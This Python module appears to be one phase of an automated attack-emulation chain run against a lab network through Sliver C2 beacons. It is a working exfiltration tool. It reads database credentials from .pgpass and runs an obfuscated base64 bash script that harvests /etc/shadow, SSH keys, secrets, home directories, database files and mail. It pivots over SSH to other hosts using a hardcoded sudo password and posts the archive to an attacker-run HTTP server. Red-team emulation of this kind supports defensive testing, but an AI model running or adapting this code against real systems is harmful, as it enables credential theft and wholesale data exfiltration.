import os
import re
import time
import subprocess
import threading
import base64

from chainlog import log
from advanced_initial_access import sliver_exec


# =============================================================================
# advanced_exfiltration.py — Advanced DB Exfiltration
# MITRE ATT&CK:
#   TA0010 - Exfiltration
#   T1041  - Exfiltration Over C2 Channel
#   T1567  - Exfiltration Over Web Service (simulated via C2 download)
# =============================================================================

PGPASS_PATH = "/home/vinzenz.fedora/.pgpass"
DB_HOST = "10.30.0.6"
DUMP_REMOTE_PATH = "/tmp/.sys_backup.gz"
EXFIL_HTTP_PORT = 9443                       # Kali-side HTTP receive port
KALI_IP = "10.10.0.2"


# ---------------------------------------------------------------------------
# Helpers: beacon task polling
# ---------------------------------------------------------------------------

def _beacon_task_wait(beacon_id: str, task_id: str, *,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    """Poll `tasks fetch <id>` until ✅ Completed, return the output section."""
    for i in range(max_polls):
        time.sleep(interval)
        fetch_out = sliver_exec(beacon_id, f"tasks fetch {task_id}", timeout=30)
        if "✅ Completed" in fetch_out:
            if "[*] Output:" in fetch_out:
                return fetch_out.split("[*] Output:", 1)[1].strip()
            return fetch_out
    return None


def _beacon_exec_wait(beacon_id: str, command: str, *,
                      cmd_timeout: int = 120,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    """Submit a beacon command and wait for its task to finish.

    Returns the task output or None on failure.
    """
    output = sliver_exec(beacon_id, command, timeout=cmd_timeout)
    m = re.search(r"\[\*\] Tasked beacon \w+ \((.*?)\)", output)
    if not m:
        log(f"[-] No task ID found. Output: {output.strip()}")
        return None
    task_id = m.group(1)
    log(f"[*] Beacon task {task_id} submitted. Polling for completion …")
    return _beacon_task_wait(beacon_id, task_id,
                             max_polls=max_polls, interval=interval)


# ---------------------------------------------------------------------------
# Kali-side one-shot HTTP receive server (runs in a background thread)
# ---------------------------------------------------------------------------

def _start_receive_server(port: int, output_path: str):
    """One-shot HTTP server: accepts a single POST, saves the body, then exits."""
    script = (
        f"import http.server\n"
        f"class H(http.server.BaseHTTPRequestHandler):\n"
        f"    def do_POST(self):\n"
        f"        n=int(self.headers['Content-Length'])\n"
        f"        with open('{output_path}','wb') as fh: fh.write(self.rfile.read(n))\n"
        f"        self.send_response(200);self.end_headers()\n"
        f"    def log_message(self,*a):pass\n"
        f"http.server.HTTPServer(('0.0.0.0',{port}),H).handle_request()\n"
    )
    proc = subprocess.Popen(
        ["python3", "-c", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)
    if proc.poll() is not None:
        raise RuntimeError(f"Receive server exited immediately — port {port} busy?")
    log(f"[+] HTTP receive server listening on 0.0.0.0:{port}")
    return proc


def _stop_receive_server(proc):
    if proc and proc.poll() is None:
        proc.terminate()


# ---------------------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------------------

def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
    """Read ~/.pgpass from vinzenz_ws via the beacon."""
    log(f"[*] Reading DB credentials from {PGPASS_PATH} …")
    result = _beacon_exec_wait(
        vinzenz_beacon,
        f"execute -o -- cat {PGPASS_PATH}",
        max_polls=15, interval=5,
    )
    if result is None:
        log("[-] Task did not complete or returned no output.")
        return None

    for line in result.splitlines():
        line = line.strip()
        # Skip Sliver table formatting lines
        if (not line or line.startswith("#") or
            any(kw in line for kw in (
                "Task", "State", "Description", "Created", "Sent",
                "Completed", "Request Size", "Response Size",
                "+-", "| ", "[*]"))):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}

    log(f"[-] No usable credential found in .pgpass")
    return None


def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -> bool:
    """Run exfiltration across all hosts on the network.
    
    Creates target tarballs from remote hosts streamed over SSH without local
    writes on the target workstations, packs them into a master archive,
    and exfiltrates back to Kali.
    """
    exfil_local_path = os.path.join(results_dir, "master_exfil.tar.gz")
    os.makedirs(results_dir, exist_ok=True)
    
    # Start the one-shot HTTP receiver server on Kali
    recv_proc = _start_receive_server(EXFIL_HTTP_PORT, exfil_local_path)
    
    exfil_ok = False
    try:
        # Build the shell script to run on vinzenz_ws
        exfil_script = f"""#!/bin/bash

# Create staging directory
mkdir -p /tmp/exfil/local
mkdir -p /tmp/exfil/john
mkdir -p /tmp/exfil/luke
mkdir -p /tmp/exfil/apache

# Database host info
DB_IP="{creds['host']}"

# Helper function to stage files locally on Vinzenz Workstation (with sudo)
stage_local_files() {{
    echo "[*] Collecting local target files on Vinzenz Workstation ..."
    # 1. Credentials, history, system configs
    sudo cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
    sudo cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
    sudo cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
    
    # 2. Complete Home & Root Directories (harvested file-by-file for custom processing chains)
    for udir in /home/* /root; do
        [ -d "$udir" ] || continue
        uname=$(basename "$udir")
        echo "[*] Archiving local user home: $uname ..."
        
        # Staging folder for this specific user
        ustage="/tmp/exfil/local/home_$uname"
        mkdir -p "$ustage"
        
        # Find all regular files, excluding .cache
        sudo find "$udir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
            # Compute relative path under home
            relpath="${filepath#$udir/}"
            # Target dir structure under staging
            reldir=$(dirname "$relpath")
            mkdir -p "$ustage/$reldir"
            
            # Chainable Operation: load, compress (gzip) and save to staging folder
            # We compress individually so we can easily add custom encryption or rename steps here later
            sudo gzip -c "$filepath" > "$ustage/$relpath.gz" 2>/dev/null || true
        done
        
        # Package this user's staged home folder into a tarball
        sudo tar -czf "/tmp/exfil/local/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
        sudo rm -rf "$ustage"
    done
    
    # SSH server keys
    if [ -d /etc/ssh ]; then
        mkdir -p /tmp/exfil/local/etc_ssh
        sudo cp -r /etc/ssh/* /tmp/exfil/local/etc_ssh/ 2>/dev/null || true
    fi

    # Secrets and physical DB stores
    if [ -d /run/secrets ]; then
        mkdir -p /tmp/exfil/local/run_secrets
        sudo cp -r /run/secrets/* /tmp/exfil/local/run_secrets/ 2>/dev/null || true
    fi

    for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
        if [ -d "$db_dir" ]; then
            dbname=$(basename "$db_dir")
            echo "[*] Found local DB directory: $db_dir. Archiving..."
            sudo tar -czf "/tmp/exfil/local/db_dir_$dbname.tar.gz" -C "$db_dir" . 2>/dev/null || true
        fi
    done

    # Local mail
    for mdir in /var/spool/mail /var/mail; do
        if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
            mkdir -p /tmp/exfil/local/mail
            sudo cp -r "$mdir"/* /tmp/exfil/local/mail/ 2>/dev/null || true
        fi
    done
}}

# Execute local collection
stage_local_files

# Dump PostgreSQL Database
echo "[*] Dumping database from $DB_IP ..."
PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"

# Helper for remote harvesting script (sent to other hosts)
build_remote_harvest_script() {{
    cat << 'EOF'
#!/bin/bash
mkdir -p /tmp/harvest
sudo cp /etc/shadow /tmp/harvest/shadow 2>/dev/null || true
sudo cp /var/log/auth.log /tmp/harvest/auth.log 2>/dev/null || true
sudo cp /var/log/secure /tmp/harvest/secure 2>/dev/null || true

# Complete Home & Root Directories (harvested file-by-file for custom processing chains)
for udir in /home/* /root; do
    [ -d "$udir" ] || continue
    uname=$(basename "$udir")
    ustage="/tmp/harvest/home_$uname"
    mkdir -p "$ustage"
    
    sudo find "$udir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
        relpath="${filepath#$udir/}"
        reldir=$(dirname "$relpath")
        mkdir -p "$ustage/$reldir"
        
        # Chainable Operation: load, compress (gzip) and save to staging folder
        sudo gzip -c "$filepath" > "$ustage/$relpath.gz" 2>/dev/null || true
    done
    
    sudo tar -czf "/tmp/harvest/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
    sudo rm -rf "$ustage"
done

if [ -d /etc/ssh ]; then
    mkdir -p /tmp/harvest/etc_ssh
    sudo cp -r /etc/ssh/* /tmp/harvest/etc_ssh/ 2>/dev/null || true
fi

# Web files & secrets
if [ -d /var/www/html ]; then
    mkdir -p /tmp/harvest/var_www_html
    sudo cp -r /var/www/html/* /tmp/harvest/var_www_html/ 2>/dev/null || true
fi

if [ -d /run/secrets ]; then
    mkdir -p /tmp/harvest/run_secrets
    sudo cp -r /run/secrets/* /tmp/harvest/run_secrets/ 2>/dev/null || true
fi

for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
    if [ -d "$db_dir" ]; then
        dbname=$(basename "$db_dir")
        sudo tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "$db_dir" . 2>/dev/null || true
    fi
done

for mdir in /var/spool/mail /var/mail; do
    if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
        mkdir -p /tmp/harvest/mail
        sudo cp -r "$mdir"/* /tmp/harvest/mail/ 2>/dev/null || true
    fi
done

# Compress all harvested files to stdout
tar -czf - -C /tmp/harvest . 2>/dev/null
rm -rf /tmp/harvest
EOF
}}

# Compress & stream John's Workstation files
echo "[*] Harvesting files from John's workstation ..."
build_remote_harvest_script > /tmp/harvester.sh
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"

# Compress & stream Luke's Workstation files
echo "[*] Harvesting files from Luke's workstation ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null luke 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/luke/luke_harvest.tar.gz || echo "[-] Luke workstation harvest failed"

# Compress & stream Apache Webserver files
echo "[*] Harvesting files from Apache Webserver ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null apache 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/apache/apache_harvest.tar.gz || echo "[-] Apache harvest failed"

rm -f /tmp/harvester.sh

# Pack everything into a master archive
echo "[*] Creating master archive /tmp/master_exfil.tar.gz ..."
tar -czf /tmp/master_exfil.tar.gz -C /tmp/exfil .

# Clean up staging directory
rm -rf /tmp/exfil

# Exfiltrate to Kali
echo "[*] Exfiltrating master archive to Kali http://{KALI_IP}:{EXFIL_HTTP_PORT}/ ..."
python3 -c "import urllib.request; data=open('/tmp/master_exfil.tar.gz','rb').read(); urllib.request.urlopen('http://{KALI_IP}:{EXFIL_HTTP_PORT}/', data=data, timeout=120)"

# Clean up master archive
rm -f /tmp/master_exfil.tar.gz
echo "[+] Script completed successfully"
"""
        b64_script = base64.b64encode(exfil_script.encode()).decode()
        
        # Execute the script on vinzenz_ws
        log("[*] Tasking beacon to run exfiltration script on all network hosts …")
        task_output = _beacon_exec_wait(
            vinzenz_beacon,
            f"execute -o -- sh -c 'echo {b64_script} | base64 -d | bash'",
            cmd_timeout=180,
            max_polls=36,
            interval=5
        )
        
        if task_output:
            log(f"[+] Beacon task completed. Output:\n{task_output}")
        else:
            log("[-] Beacon task did not return output or timed out.")
            
        # Give a small buffer for the receive server to flush
        time.sleep(3)
        
        # Verify file exists on Kali
        if os.path.exists(exfil_local_path) and os.path.getsize(exfil_local_path) > 0:
            size_mb = os.path.getsize(exfil_local_path) / (1024 * 1024)
            log(f"[+] Master exfiltration archive successfully received on Kali: {exfil_local_path} ({size_mb:.2f} MB)")
            exfil_ok = True
        else:
            log(f"[-] Exfiltration archive not found or empty on Kali at {exfil_local_path}")
            
    except Exception as e:
        log(f"[-] Exception during exfiltration: {e}")
    finally:
        _stop_receive_server(recv_proc)
        
    return exfil_ok


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict:
    """Execute Phase 8: Data Exfiltration via the workstation beacon."""
    log("\n[*] Starting Advanced Data Exfiltration (Phase 8) …")

    if not vinzenz_beacon:
        log("[-] No active vinzenz beacon provided. Cannot proceed.")
        return {"exfil_success": False}

    # 1. Credential discovery -------------------------------------------------
    creds = _discover_db_creds(vinzenz_beacon)
    if not creds:
        return {"exfil_success": False}

    # Enforce known DB host (dynamic recon will be added later)
    creds["host"] = DB_HOST

    # 2. Network exfiltration -------------------------------------------------
    exfil_ok = _perform_network_exfil(vinzenz_beacon, creds, results_dir)

    if exfil_ok:
        log("[+] Phase 8: Advanced Data Exfiltration completed successfully.")
    else:
        log("[-] Phase 8: Advanced Data Exfiltration failed.")

    return {"exfil_success": exfil_ok}


if __name__ == "__main__":
    pass
